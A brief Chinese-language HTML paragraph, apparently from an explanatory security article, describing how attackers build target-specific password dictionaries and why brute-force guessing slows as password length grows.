 &lt;p>攻击者还可能根据目标的个人信息、社交网络信息或公司网站等创建面向目标的字典来进行密码猜测，以提高成功率。最后的手段是尝试所有可能的密码，即暴力攻击。理论上，如果不限制尝试次数，暴力攻击总是会成功，因为密码的规则必须是公开的。然而，随着密码长度的增加，可能的密码数量也会增加，导致攻击所需的时间更长。&lt;/p>
